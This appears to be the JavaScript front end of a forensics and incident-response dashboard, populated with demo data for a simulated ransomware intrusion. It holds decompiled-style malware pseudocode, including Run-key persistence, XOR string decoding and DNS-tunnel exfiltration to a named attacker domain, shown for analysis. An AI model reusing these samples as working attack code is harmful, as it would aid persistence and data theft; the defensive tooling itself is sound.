// app.js
// Stateful Government Workstation Integrations via REST & WebSockets

let globalTimelineEvents = [];
let socket = null;
let activeCaseId = "CASE_2026_APT29_CHIMERA";

document.addEventListener("DOMContentLoaded", () => {
    // 1. Initial REST Sync
    syncDashboardMetrics();
    syncTimelineEvents();
    
    // 2. Interactive Component Setup
    initTabs();
    initExplorerTree();
    initMemory();
    initNetwork();
    initDecompiler();
    initCopilot();
    initAuditLogs();
    
    // Advanced Workstation Features Init
    initMitreInteractive();
    initYaraRules();
    initHexViewer();
    initOsintConsole();
    initCaseSelector();
    initProfileOverlay();
    
    // 3. Setup WebSocket Listener
    initWebSocket();
    
    // 4. Setup Evidence Ingestion Handler
    initEvidenceUpload();
});

// Helper: Programmatic Tab Switcher
function switchTab(tabId) {
    const navItems = document.querySelectorAll(".horizontal-nav .nav-item");
    const tabPanels = document.querySelectorAll(".tab-panel");

    navItems.forEach(nav => nav.classList.remove("active"));
    tabPanels.forEach(panel => panel.classList.remove("active"));

    const targetNavItem = Array.from(navItems).find(item => item.getAttribute("data-tab") === tabId);
    if (targetNavItem) targetNavItem.classList.add("active");

    const targetPanel = document.getElementById(`panel-${tabId}`);
    if (targetPanel) targetPanel.classList.add("active");
}

// 1. Navigation Tab Click Event Listener
function initTabs() {
    const navItems = document.querySelectorAll(".horizontal-nav .nav-item");
    navItems.forEach(item => {
        item.addEventListener("click", () => {
            const selectedTab = item.getAttribute("data-tab");
            switchTab(selectedTab);
        });
    });
}

// 2. Left Folder/Evidence Tree Explorer Click Redirects
function initExplorerTree() {
    const explorer = document.querySelector(".evidence-explorer");
    if (!explorer) return;

    explorer.addEventListener("click", (event) => {
        const reportBtn = event.target.closest(".btn-generate-report");
        if (reportBtn) {
            event.stopPropagation();
            event.preventDefault();
            const item = reportBtn.closest(".tree-item");
            const labelSpan = item.querySelector(".file-label");
            const fileName = labelSpan ? labelSpan.textContent.replace(/[💾🧠🔌🔑⚙️☣️]/g, "").trim() : item.textContent.replace(/[💾🧠🔌🔑⚙️☣️📄]/g, "").trim();
            triggerReportGeneration(fileName);
            return;
        }

        const item = event.target.closest(".tree-item");
        if (!item) return;

        // Manage active states
        document.querySelectorAll(".tree-item").forEach(t => t.classList.remove("active"));
        item.classList.add("active");

        const itemId = item.getAttribute("id") || "";
        const itemText = item.innerText.toLowerCase().trim();

        // 1. Memory dumps (raw, mem, dmp)
        if (itemId === "tree-mem-img" || itemText.endsWith(".raw") || itemText.endsWith(".mem") || itemText.endsWith(".dmp")) {
            switchTab("memory");
        }
        // 2. Network packet flow traces (pcap, pcapng)
        else if (itemId === "tree-traffic-pcap" || itemText.endsWith(".pcap") || itemText.endsWith(".pcapng")) {
            switchTab("network");
        }
        // 3. Binaries & Executables (exe, bin, elf)
        else if (itemId === "tree-updater-bin" || itemText.endsWith(".exe") || itemText.endsWith(".bin") || itemText.endsWith(".elf")) {
            switchTab("reverse");
        }
        // 4. Extracted hives, disk dumps, general files (timeline)
        else {
            switchTab("timeline");
        }
    });
}

// 3. Dashboard API Synchronizer (REST GET)
async function syncDashboardMetrics() {
    try {
        const response = await fetch("/api/v1/cases");
        if (response.ok) {
            const cases = await response.json();
            const caseData = cases.find(c => c.name === activeCaseId) || cases[0];
            if (caseData) {
                const dropdown = document.getElementById("case-selector");
                if (dropdown && dropdown.value !== caseData.name) {
                    dropdown.value = caseData.name;
                }
                
                const numElement = document.getElementById("case-number-val");
                if (numElement) {
                    numElement.innerText = caseData.caseNumber || "-";
                }
                
                document.getElementById("yara-matches-count").innerText = `${caseData.yaraMatches} Indicators`;
                document.getElementById("sla-timer").innerText = caseData.slaTimer;
                
                const sessionTimer = document.getElementById("profile-session-timer");
                if (sessionTimer) {
                    sessionTimer.innerText = caseData.slaTimer;
                }
                
                const severityBadge = document.getElementById("case-severity-badge");
                if (severityBadge) {
                    severityBadge.innerText = `${caseData.severity} SEVERITY`;
                    
                    severityBadge.className = "badge";
                    if (caseData.severity === "CRITICAL") {
                        severityBadge.classList.add("badge-danger");
                    } else if (caseData.severity === "HIGH") {
                        severityBadge.classList.add("badge-warning");
                    } else {
                        severityBadge.classList.add("badge-info");
                    }
                }
            }
        }
    } catch (e) {
        console.error("Dashboard sync metrics failure:", e);
    }
}

// 4. Timeline API Synchronizer (REST GET & Text Filter)
async function syncTimelineEvents() {
    const container = document.getElementById("timeline-events-container");
    const searchInput = document.getElementById("timeline-search");
    const filters = document.querySelectorAll(".timeline-filter");

    async function fetchAndRender() {
        try {
            const response = await fetch(`/api/v1/cases/${activeCaseId}/timeline`);
            if (response.ok) {
                const data = await response.json();
                globalTimelineEvents = data.events;
                render();
            }
        } catch (e) {
            console.error("Timeline fetching failure:", e);
        }
    }

    function render() {
        const query = searchInput.value.toLowerCase();
        const activeTypes = Array.from(filters).filter(f => f.checked).map(f => f.value);

        container.innerHTML = "";
        globalTimelineEvents.forEach(event => {
            if (activeTypes.includes(event.type) || event.type === "FILE") {
                if (event.msg.toLowerCase().includes(query) || event.type.toLowerCase().includes(query)) {
                    const row = document.createElement("div");
                    row.className = `timeline-entry ${event.type}`;
                    row.innerHTML = `
                        <span class="time">${event.time}</span>
                        <span class="type">[${event.type}]</span>
                        <span class="msg">${event.msg} <strong style="color:var(--color-danger)">(${event.tag || 'T1059'})</strong></span>
                    `;
                    container.appendChild(row);
                }
            }
        });
    }

    searchInput.addEventListener("input", render);
    filters.forEach(f => f.addEventListener("change", render));
    
    // Run initial fetch
    await fetchAndRender();
}

// 5. Memory Volatility Tree Component
const processes = [
    { pid: 4, name: "System", ppid: 0, path: "kernel", suspicious: false },
    { pid: 140, name: "smss.exe", ppid: 4, path: "\\SystemRoot\\System32\\smss.exe", suspicious: false },
    { pid: 520, name: "wininit.exe", ppid: 140, path: "C:\\Windows\\System32\\wininit.exe", suspicious: false },
    { pid: 580, name: "services.exe", ppid: 520, path: "C:\\Windows\\System32\\services.exe", suspicious: false },
    { pid: 884, name: "lsass.exe", ppid: 3320, path: "C:\\Windows\\System32\\lsass.exe", suspicious: true, alert: "Parent Process Anomaly: Spawned by GPUPDATE.EXE (PID 3320)" },
    { pid: 3320, name: "gpupdate.exe", ppid: 580, path: "C:\\Windows\\Temp\\gpupdate.exe", suspicious: true, alert: "Executing from temporary path" }
];

const processDLLs = {
    884: [
        { name: "ntdll.dll", signed: true },
        { name: "kernel32.dll", signed: true },
        { name: "lsasrv.dll", signed: true },
        { name: "samlib.dll", signed: true },
        { name: "mimidrv.sys", signed: false }
    ],
    3320: [
        { name: "ntdll.dll", signed: true },
        { name: "kernel32.dll", signed: true },
        { name: "sideload.dll", signed: false }
    ]
};

function initMemory() {
    const procContainer = document.getElementById("process-tree-container");
    const dllContainer = document.getElementById("dll-list-container");

    function renderDLLs(pid) {
        dllContainer.innerHTML = "";
        const modules = processDLLs[pid] || [
            { name: "ntdll.dll", signed: true },
            { name: "kernel32.dll", signed: true },
            { name: "user32.dll", signed: true }
        ];

        modules.forEach(dll => {
            const item = document.createElement("div");
            item.className = `dll-item ${!dll.signed ? 'unsigned' : ''}`;
            item.innerHTML = `
                <span>${dll.name}</span>
                <span>${dll.signed ? '✓ Valid Signature' : '✗ Unsigned Module'}</span>
            `;
            dllContainer.appendChild(item);
        });
    }

    processes.forEach(proc => {
        const node = document.createElement("div");
        node.className = `proc-node ${proc.suspicious ? 'suspicious' : ''}`;
        node.innerHTML = `
            <span>|__ [PID ${proc.pid}] ${proc.name}</span>
            <span style="color:var(--text-secondary)">${proc.path}</span>
        `;
        node.addEventListener("click", () => {
            document.querySelectorAll(".proc-node").forEach(n => n.classList.remove("active-selection"));
            node.classList.add("active-selection");
            renderDLLs(proc.pid);
        });
        procContainer.appendChild(node);
    });

    renderDLLs(884);
}

// 6. Network PCAP Flows
const rawFlows = [
    { src: "192.168.42.10", sport: 49221, dst: "185.220.101.4", dport: 443, proto: "HTTPS", bytes: "14.2 MB", state: "CLOSED" },
    { src: "192.168.42.20", sport: 51224, dst: "192.168.42.1", dport: 53, proto: "DNS", bytes: "154.2 MB", state: "ACTIVE" },
    { src: "192.168.42.10", sport: 49302, dst: "192.168.42.20", dport: 3389, proto: "RDP", bytes: "45.1 MB", state: "ESTABLISHED" },
    { src: "192.168.42.20", sport: 445, dst: "192.168.42.10", dport: 50412, proto: "SMB", bytes: "1.2 MB", state: "CLOSED" }
];

function initNetwork() {
    const container = document.getElementById("network-flows-container");
    rawFlows.forEach(flow => {
        const row = document.createElement("tr");
        if (flow.dport === 53 && parseInt(flow.bytes) > 100) {
            row.className = "table-row-danger";
        }
        row.innerHTML = `
            <td>${flow.src}</td>
            <td>${flow.sport}</td>
            <td>${flow.dst}</td>
            <td>${flow.dport}</td>
            <td>${flow.proto}</td>
            <td>${flow.bytes}</td>
            <td>${flow.state}</td>
        `;
        container.appendChild(row);
    });
}

// 7. Decompiler Workspace Codes
const functionCodes = {
    "_main": `
int _main(int argc, char** argv) {
    if (check_sandbox()) {
        exit(0);
    }
    _decode_strings();
    _setup_persistence();
    _resolve_c2_address();
    _exfil_data();
    _encrypt_files();
    return 0;
}`,
    "_setup_persistence": `
void _setup_persistence(void) {
    HKEY hKey;
    char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char* binaryPath = "C:\\Windows\\Temp\\updater.exe";
    
    long status = RegOpenKeyExA(HKEY_LOCAL_MACHINE, runKey, 0, KEY_WRITE, &hKey);
    if (status == 0) {
        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (const BYTE*)binaryPath, strlen(binaryPath));
        RegCloseKey(hKey);
    }
    return;
}`,
    "_decode_strings": `
void _decode_strings(void) {
    char xor_key = 0xAA;
    for(int i = 0; i < encoded_length; i++) {
        decoded_string[i] = encoded_string[i] ^ xor_key;
    }
    return;
}`,
    "_resolve_c2_address": `
void _resolve_c2_address(void) {
    gethostbyname("exfil-dns-tunnel.net");
    return;
}`,
    "_exfil_data": `
void _exfil_data(void) {
    while(data_blocks_remain) {
        char* domain_chunk = encode_base64(data_block);
        send_dns_query(domain_chunk, "exfil-dns-tunnel.net");
    }
}`,
    "_encrypt_files": `
void _encrypt_files(void) {
    BCryptGenRandom(NULL, file_aes_key, 32, 0);
    encrypt_directory("C:\\Users\\");
    drop_ransom_note("C:\\HELP_DECRYPT.txt");
}`
};

function initDecompiler() {
    const funcItems = document.querySelectorAll(".re-func-item");
    const codeElement = document.getElementById("code-content-element");

    funcItems.forEach(item => {
        item.addEventListener("click", () => {
            funcItems.forEach(i => i.classList.remove("active"));
            item.classList.add("active");
            
            const funcName = item.innerText;
            codeElement.innerText = functionCodes[funcName] || "// Code not extracted";
        });
    });
}

// 8. AI Copilot Chat Box (REST POST to FastAPI)
function initCopilot() {
    const chatBox = document.getElementById("copilot-chat-box");
    const input = document.getElementById("copilot-chat-input");
    const sendBtn = document.getElementById("copilot-send-btn");
    const chipBtns = document.querySelectorAll(".prompt-chip");

    async function sendMsg(msgText) {
        if (!msgText.trim()) return;

        // Render User Query Bubble
        const userBubble = document.createElement("div");
        userBubble.className = "chat-bubble user-bubble";
        userBubble.innerText = msgText;
        chatBox.appendChild(userBubble);
        
        chatBox.scrollTop = chatBox.scrollHeight;
        input.value = "";

        // Trigger REST call to FastAPI Copilot route
        try {
            const response = await fetch("/api/v1/copilot/chat", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    caseId: "CASE_2026_APT29_CHIMERA",
                    prompt: msgText
                })
            });

            if (response.ok) {
                const result = await response.json();
                
                const aiBubble = document.createElement("div");
                aiBubble.className = "chat-bubble ai-bubble";
                aiBubble.innerHTML = result.answer.replace(/\n/g, "<br>");
                
                // Add confidence warning if low
                if (result.confidenceScore < 0.5) {
                    aiBubble.innerHTML += `<br><span style="font-size:9px;color:var(--color-danger);font-weight:700;">⚠ Low confidence matching indicators</span>`;
                }

                chatBox.appendChild(aiBubble);
                chatBox.scrollTop = chatBox.scrollHeight;
            }
        } catch (e) {
            console.error("AI Copilot request failure:", e);
        }
    }

    sendBtn.addEventListener("click", () => sendMsg(input.value));
    input.addEventListener("keydown", (e) => {
        if (e.key === "Enter") sendMsg(input.value);
    });

    chipBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            const prompt = btn.getAttribute("data-prompt");
            sendMsg(prompt);
        });
    });
}

// 9. WebSocket Communications Manager
function initWebSocket() {
    const wsProto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${wsProto}//${window.location.host}/api/v1/ws`;
    
    socket = new WebSocket(wsUrl);

    socket.onopen = () => {
        console.log("[+] WebSocket link active with backend gateway.");
        addAuditLine("ROBLOCKSEC_SYS", "WS_CONNECT", "Live WebSocket connection established successfully.");
    };

    socket.onmessage = (event) => {
        const msg = JSON.parse(event.data);
        
        if (msg.event === "TASK_PROGRESS") {
            handleTaskProgress(msg.data);
        } else if (msg.event === "NEW_ALERT") {
            handleNewAlert(msg.data);
        }
    };

    socket.onclose = () => {
        console.log("[-] WebSocket connection terminated. Reconnecting...");
        setTimeout(initWebSocket, 5000); // Auto-reconnect loop
    };
}

// Handle Ingestion Task Updates
function handleTaskProgress(data) {
    const box = document.getElementById("ingest-progress-box");
    const percentText = document.getElementById("ingest-percent");
    const bar = document.getElementById("ingest-progress-bar");
    const statusText = document.getElementById("ingest-status-text");

    box.style.display = "block";
    percentText.innerText = `${data.percentageComplete}%`;
    bar.style.style = `width: ${data.percentageComplete}%`; // Fallback
    bar.style.width = `${data.percentageComplete}%`;
    statusText.innerText = data.currentAction;

    addAuditLine("SYSTEM", "INGEST_JOB", `Stage progress: ${data.percentageComplete}% - ${data.currentAction}`);

    if (data.percentageComplete === 100) {
        syncAuditLogs();
        syncDashboardMetrics();
        setTimeout(() => {
            box.style.display = "none";
        }, 4000);
    }
}

// Handle New Threat Alert notifications
function handleNewAlert(data) {
    // 1. Increment UI indicators
    const currentMatches = document.getElementById("yara-matches-count");
    currentMatches.innerText = "4 Indicators";
    currentMatches.className = "big-value text-danger";

    // 2. Prepend row to Overview findings table
    const tableBody = document.querySelector(".forensic-table tbody");
    const newRow = document.createElement("tr");
    newRow.className = "table-row-danger";
    newRow.innerHTML = `
        <td>${new Date().toISOString().slice(11,19)} UTC</td>
        <td>Ingested Asset</td>
        <td>Live Pipeline</td>
        <td>${data.mitreTechnique}</td>
        <td>${data.message}</td>
    `;
    tableBody.insertBefore(newRow, tableBody.firstChild);

    // 3. Redraw chronological timeline view
    syncTimelineEvents();
    syncAuditLogs();
    syncDashboardMetrics();

    // 4. Force view shift to Overview to notify analyst
    switchTab("overview");
}

// 10. Evidence File Upload (REST POST)
function initEvidenceUpload() {
    const uploadBtn = document.getElementById("upload-btn");
    const fileInput = document.getElementById("evidence-file-input");

    uploadBtn.addEventListener("click", () => fileInput.click());

    fileInput.addEventListener("change", async () => {
        if (fileInput.files.length === 0) return;
        
        const file = fileInput.files[0];
        const formData = new FormData();
        formData.append("caseId", "CASE_2026_APT29_CHIMERA");
        formData.append("evidenceType", "DISK");
        formData.append("file", file);

        // Pre-display local UI directory node
        const treeList = document.querySelector(".tree-list");
        const newLi = document.createElement("li");
        
        let fileIcon = "💾";
        let fileClass = "file-e01";
        const lowerName = file.name.toLowerCase();
        
        if (lowerName.endsWith(".pcap") || lowerName.endsWith(".pcapng")) {
            fileIcon = "🔌";
            fileClass = "file-pcap";
        } else if (lowerName.endsWith(".raw") || lowerName.endsWith(".mem") || lowerName.endsWith(".dmp")) {
            fileIcon = "🧠";
            fileClass = "file-raw";
        } else if (lowerName.endsWith(".exe") || lowerName.endsWith(".bin") || lowerName.endsWith(".elf")) {
            fileIcon = "☣️";
            fileClass = "file-exe";
        } else if (lowerName.endsWith(".hive") || lowerName.includes("hive")) {
            fileIcon = "🔑";
            fileClass = "file-hive";
        }
        
        newLi.className = `tree-item ${fileClass}`;
        newLi.innerHTML = `<span class="file-label"><span class="file-icon">${fileIcon}</span> ${file.name}</span><button class="btn-generate-report" title="Generate Forensic Report">📄</button>`;
        treeList.appendChild(newLi);

        try {
            const response = await fetch("/api/v1/evidence/upload", {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                const result = await response.json();
                console.log("[+] File accepted by ingestion endpoint:", result.evidenceId);
            }
        } catch (e) {
            console.error("Evidence upload error:", e);
        }
    });
}

// 11. Custom Audit Logger Helper
function addAuditLine(userId, action, message) {
    const container = document.getElementById("audit-log-container");
    if (!container) return;

    const timeString = new Date().toISOString().slice(11, 19) + " UTC";
    const line = document.createElement("div");
    line.style.padding = "4px 8px";
    line.style.borderBottom = "1px solid rgba(0,0,0,0.02)";
    line.innerHTML = `
        <span style="color:var(--accent-blue)">${timeString}</span> | 
        <strong style="color:var(--color-warning)">[${action}]</strong> 
        User ID: <strong style="color:var(--text-primary)">${userId}</strong>: ${message}
    `;
    container.insertBefore(line, container.firstChild);
}

async function syncAuditLogs() {
    const container = document.getElementById("audit-log-container");
    if (!container) return;
    
    try {
        const response = await fetch(`/api/v1/cases/${activeCaseId}/coc`);
        if (response.ok) {
            const cocRecords = await response.json();
            container.innerHTML = "";
            cocRecords.forEach(log => {
                const line = document.createElement("div");
                line.style.padding = "6px 10px";
                line.style.borderBottom = "1px solid rgba(0,0,0,0.04)";
                line.style.fontFamily = "JetBrains Mono, monospace";
                line.style.fontSize = "10px";
                
                // Format timestamp
                const formattedTime = log.timestamp.replace("T", " ").substring(0, 19);
                
                line.innerHTML = `
                    <span style="color:var(--accent-blue)">[${formattedTime}]</span> 
                    <strong style="color:var(--color-warning)">[${log.action}]</strong> 
                    Actor: <strong style="color:var(--text-primary)">${log.actor}</strong> | 
                    Asset: <strong style="color:var(--text-secondary)">${log.fileName}</strong> | 
                    SHA-256: <code style="background:var(--bg-input); padding:1px 4px; border-radius:2px;">${log.sha256.substring(0,16)}...</code> | 
                    Signature: <span style="color:var(--text-secondary)">${log.digitalSignature.substring(0,16)}...</span>
                `;
                container.appendChild(line);
            });
        }
    } catch (e) {
        console.error("Audit log sync failure:", e);
    }
}

function initAuditLogs() {
    syncAuditLogs();
}

// 12. Interactive MITRE ATT&CK Mapping Grid
const mitreDetails = {
    "T1566": {
        name: "T1566: Phishing Initial Access",
        desc: "Adversary delivered an email campaign containing a zipped malicious payload (Resume_Review.zip) targeting internal HR units. Ingested under ws01_disk.e01."
    },
    "T1204": {
        name: "T1204: User Execution",
        desc: "Forensics logs confirm the target recipient clicked and extracted the compressed archive payload, executing the local updater script."
    },
    "T1547": {
        name: "T1547: Registry Persistence",
        desc: "The payload established autorun keys in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to C:\\Windows\\Temp\\updater.exe."
    },
    "T1078": {
        name: "T1078: Valid Accounts",
        desc: "No active technique matches. This tactic remains inactive for current indicator sweeps."
    },
    "T1140": {
        name: "T1140: Deobfuscate/Decode Files",
        desc: "No active technique matches. This tactic remains inactive for current indicator sweeps."
    },
    "T1003.001": {
        name: "T1003.001: LSASS Memory Dumping",
        desc: "Adversary process GPUPDATE.EXE (PID 3320) injected code blocks and dumped credential database hashes from local security authority process LSASS (PID 884)."
    },
    "T1046": {
        name: "T1046: Network Service Scanning",
        desc: "No active technique matches. This tactic remains inactive for current indicator sweeps."
    },
    "T1021.002": {
        name: "T1021.002: Remote Desktop Lateral Entry",
        desc: "Lateral movement confirmed. Intruder initialized lateral sessions from compromised endpoint WS-01 to backend database host SRV-02 using port 3389."
    },
    "T1114": {
        name: "T1114: Email Collection",
        desc: "No active technique matches. This tactic remains inactive for current indicator sweeps."
    },
    "T1048": {
        name: "T1048: DNS Subdomain Tunneling Exfiltration",
        desc: "Network capture logs verify data exfiltration targeting host exfil-dns-tunnel.net using DNS subdomain TXT record queries."
    },
    "T1486": {
        name: "T1486: Ransomware Impact",
        desc: "Intruder executed volume shadow deletions and encrypted local users profiles, dropping file recovery instructions in C:\\HELP_DECRYPT.txt."
    }
};

function initMitreInteractive() {
    const container = document.getElementById("mitre-matrix-container");
    const card = document.getElementById("mitre-detail-card");
    const techId = document.getElementById("mitre-tech-id");
    const techName = document.getElementById("mitre-tech-name");
    const techDesc = document.getElementById("mitre-tech-desc");
    const closeBtn = document.getElementById("close-mitre-card");

    if (!container) return;

    const cells = container.querySelectorAll(".mitre-cell");
    cells.forEach(cell => {
        cell.addEventListener("click", () => {
            cells.forEach(c => c.classList.remove("active-selection"));
            
            const tech = cell.getAttribute("data-tech");
            if (cell.classList.contains("active") && mitreDetails[tech]) {
                cell.classList.add("active-selection");
                card.style.display = "block";
                techId.innerText = tech;
                techName.innerText = mitreDetails[tech].name;
                techDesc.innerText = mitreDetails[tech].desc;
            } else {
                card.style.display = "none";
            }
        });
    });

    closeBtn.addEventListener("click", () => {
        card.style.display = "none";
        cells.forEach(c => c.classList.remove("active-selection"));
    });
}

// 13. YARA Signature index manager
async function syncYaraRulesList() {
    const listContainer = document.getElementById("yara-rules-list");
    if (!listContainer) return;

    try {
        const response = await fetch("/api/v1/yara/rules");
        if (response.ok) {
            const rules = await response.json();
            listContainer.innerHTML = "";
            rules.forEach(rule => {
                const item = document.createElement("div");
                item.style.padding = "6px 8px";
                item.style.borderBottom = "1px solid var(--border-color)";
                item.style.lineHeight = "1.3";
                item.innerHTML = `
                    <div style="font-weight:700; color:var(--text-primary);">rule ${rule.name}</div>
                    <div style="font-size:9px; color:var(--text-secondary);">${rule.description}</div>
                    <div style="font-size:8.5px; color:var(--accent-blue);">MITRE: ${rule.mitreTechnique} | severity: <span style="color:var(--color-danger);">${rule.severity}</span></div>
                `;
                listContainer.appendChild(item);
            });
        }
    } catch (e) {
        console.error("YARA rules sync failure:", e);
    }
}

function initYaraRules() {
    const compileBtn = document.getElementById("yara-compile-btn");
    const editor = document.getElementById("yara-rule-editor");
    const indicator = document.getElementById("yara-status-indicator");

    if (!compileBtn) return;

    compileBtn.addEventListener("click", async () => {
        indicator.innerText = "Compiling...";
        indicator.style.color = "var(--text-secondary)";

        try {
            const response = await fetch("/api/v1/yara/compile", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: editor.value })
            });

            if (response.ok) {
                const result = await response.json();
                if (result.status === "SUCCESS") {
                    indicator.innerText = "✔ REGISTERED";
                    indicator.style.color = "var(--text-safe)";
                    syncYaraRulesList();
                    addAuditLine("AGENT_SMITH", "YARA_COMPILE", `Compiled user rule: ${result.ruleName}`);
                } else {
                    indicator.innerText = `❌ ERROR: ${result.message}`;
                    indicator.style.color = "var(--color-danger)";
                }
            }
        } catch (e) {
            indicator.innerText = "❌ ERROR: Connection failure";
            indicator.style.color = "var(--color-danger)";
        }
    });

    syncYaraRulesList();
}

// 14. Forensics Hex Viewer Generator
function generateHexdump(text) {
    let output = "";
    let bytes = [];
    for (let i = 0; i < text.length; i++) {
        bytes.push(text.charCodeAt(i));
    }
    
    for (let offset = 0; offset < bytes.length; offset += 16) {
        let chunk = bytes.slice(offset, offset + 16);
        let offsetStr = offset.toString(16).padStart(8, '0').toUpperCase();
        
        let hexPart = chunk.map(b => b.toString(16).padStart(2, '0').toUpperCase()).join(" ");
        if (chunk.length < 16) {
            let padding = 16 - chunk.length;
            hexPart += "   ".repeat(padding);
        }
        
        let asciiPart = chunk.map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : ".").join("");
        
        output += `${offsetStr}  ${hexPart.slice(0, 23)}  ${hexPart.slice(24)}  |${asciiPart}|\n`;
    }
    return output || "NO DATA SEGMENT FOUND";
}

function initHexViewer() {
    const subtabDecompiler = document.getElementById("subtab-decompiler");
    const subtabHex = document.getElementById("subtab-hex");
    const decompilerBox = document.getElementById("decompiler-code-container");
    const hexBox = document.getElementById("hex-view-container");
    const codeElement = document.getElementById("code-content-element");

    if (!subtabDecompiler) return;

    function renderHex() {
        const textContent = codeElement.innerText;
        hexBox.innerText = generateHexdump(textContent);
    }

    subtabDecompiler.addEventListener("click", () => {
        subtabDecompiler.style.fontWeight = "700";
        subtabDecompiler.style.color = "var(--text-primary)";
        subtabHex.style.fontWeight = "400";
        subtabHex.style.color = "var(--text-secondary)";
        
        decompilerBox.style.display = "block";
        hexBox.style.display = "none";
    });

    subtabHex.addEventListener("click", () => {
        subtabHex.style.fontWeight = "700";
        subtabHex.style.color = "var(--text-primary)";
        subtabDecompiler.style.fontWeight = "400";
        subtabDecompiler.style.color = "var(--text-secondary)";
        
        decompilerBox.style.display = "none";
        hexBox.style.display = "block";
        renderHex();
    });

    // Handle updates when functions selection shifts
    const funcItems = document.querySelectorAll(".re-func-item");
    funcItems.forEach(item => {
        item.addEventListener("click", () => {
            if (hexBox.style.display === "block") {
                // Short wait to capture updated code pane elements
                setTimeout(renderHex, 100);
            }
        });
    });
}

// 15. OSINT Threat Intelligence Query Console Handler
function initOsintConsole() {
    const searchBtn = document.getElementById("osint-search-btn");
    const queryInput = document.getElementById("osint-query-input");
    const resultsBox = document.getElementById("osint-results-box");
    const resultType = document.getElementById("osint-result-type");
    const resultScore = document.getElementById("osint-result-score");
    const resultTags = document.getElementById("osint-result-tags");
    const resultRegistrar = document.getElementById("osint-result-registrar");
    const resultSummary = document.getElementById("osint-result-summary");

    if (!searchBtn) return;

    searchBtn.addEventListener("click", async () => {
        const queryVal = queryInput.value.trim();
        if (!queryVal) return;

        searchBtn.innerText = "SEARCHING...";
        searchBtn.disabled = true;

        try {
            const response = await fetch(`/api/v1/osint/search?query=${encodeURIComponent(queryVal)}`);
            if (response.ok) {
                const data = await response.json();
                resultsBox.style.display = "block";
                resultType.innerText = `${data.type} Reputation Summary`;
                resultScore.innerText = `${data.maliciousDetections}/${data.totalDetections} AV Detections`;
                
                if (data.maliciousDetections > 0) {
                    resultScore.style.color = "var(--color-danger)";
                } else {
                    resultScore.style.color = "var(--text-safe)";
                }
                
                resultTags.innerHTML = "";
                data.tags.forEach(tag => {
                    const tagBadge = document.createElement("span");
                    tagBadge.style.background = "rgba(255,255,255,0.06)";
                    tagBadge.style.border = "1px solid var(--border-color)";
                    tagBadge.style.padding = "2px 6px";
                    tagBadge.style.borderRadius = "3px";
                    tagBadge.style.fontSize = "9px";
                    tagBadge.style.color = "var(--text-secondary)";
                    tagBadge.innerText = tag;
                    resultTags.appendChild(tagBadge);
                });
                
                resultRegistrar.innerText = data.metadata;
                resultSummary.innerText = data.summary;
                
                addAuditLine("SOC_ANALYST", "OSINT_QUERY", `Reputational query complete for signature [${queryVal}]`);
            }
        } catch (e) {
            console.error("OSINT search failure:", e);
            resultsBox.style.display = "block";
            resultType.innerText = "API ERROR";
            resultScore.innerText = "N/A";
            resultScore.style.color = "var(--color-danger)";
            resultTags.innerHTML = "-";
            resultRegistrar.innerText = "-";
            resultSummary.innerText = "Failed to communicate with threat intelligence query backend.";
        } finally {
            searchBtn.innerText = "SEARCH API";
            searchBtn.disabled = false;
        }
    });
}

// 16. Case Selector Dropdown Handler
async function syncCaseSelectorOptions() {
    const selector = document.getElementById("case-selector");
    if (!selector) return;

    try {
        const response = await fetch("/api/v1/cases");
        if (response.ok) {
            const cases = await response.json();
            selector.innerHTML = "";
            cases.forEach(caseData => {
                const opt = document.createElement("option");
                opt.value = caseData.name;
                opt.text = caseData.name;
                selector.appendChild(opt);
            });
            selector.value = activeCaseId;
        }
    } catch (e) {
        console.error("Failed to sync case selector dropdown options:", e);
    }
}

function initCaseSelector() {
    const selector = document.getElementById("case-selector");
    const openModalBtn = document.getElementById("btn-create-case-modal");
    const modal = document.getElementById("create-case-modal");
    const cancelBtn = document.getElementById("new-case-cancel");
    const submitBtn = document.getElementById("new-case-submit");
    
    const newNameInput = document.getElementById("new-case-name");
    const newNumInput = document.getElementById("new-case-number");
    const newSevSelect = document.getElementById("new-case-severity");
    const newPriSelect = document.getElementById("new-case-priority");
    const errorDiv = document.getElementById("new-case-error");

    if (!selector) return;

    selector.addEventListener("change", () => {
        const selectedCase = selector.value;
        activeCaseId = selectedCase;
        
        syncDashboardMetrics();
        syncTimelineEvents();
        syncAuditLogs();
        
        addAuditLine("AGENT_SMITH", "CASE_SWITCH", `Switched active workstation context to case: ${selectedCase}`);
    });

    syncCaseSelectorOptions();

    if (openModalBtn && modal) {
        openModalBtn.addEventListener("click", () => {
            modal.style.display = "flex";
            errorDiv.style.display = "none";
            newNameInput.value = "";
            newNumInput.value = "";
        });
        
        cancelBtn.addEventListener("click", () => {
            modal.style.display = "none";
        });
        
        submitBtn.addEventListener("click", async () => {
            const nameVal = newNameInput.value.trim();
            const numVal = newNumInput.value.trim();
            
            if (!nameVal || !numVal) {
                errorDiv.innerText = "Please specify both case name and number.";
                errorDiv.style.display = "block";
                return;
            }
            
            submitBtn.innerText = "INITIALIZING...";
            submitBtn.disabled = true;
            
            try {
                const response = await fetch("/api/v1/cases", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        name: nameVal,
                        case_number: numVal,
                        severity: newSevSelect.value,
                        priority: newPriSelect.value
                    })
                });
                
                if (response.ok) {
                    const result = await response.json();
                    if (result.status === "SUCCESS") {
                        modal.style.display = "none";
                        activeCaseId = result.caseId;
                        
                        await syncCaseSelectorOptions();
                        await syncDashboardMetrics();
                        await syncTimelineEvents();
                        await syncAuditLogs();
                        
                        addAuditLine("AGENT_SMITH", "CASE_CREATE", `Initialized and focused new case context: ${result.caseId}`);
                    } else {
                        errorDiv.innerText = result.message;
                        errorDiv.style.display = "block";
                    }
                } else {
                    const err = await response.json();
                    errorDiv.innerText = err.detail || "Validation check failed.";
                    errorDiv.style.display = "block";
                }
            } catch (e) {
                errorDiv.innerText = "Failed to communicate with case creation API.";
                errorDiv.style.display = "block";
            } finally {
                submitBtn.innerText = "INITIALIZE";
                submitBtn.disabled = false;
            }
        });
    }
}

// 17. User Profile Dropdown Toggler
function initProfileOverlay() {
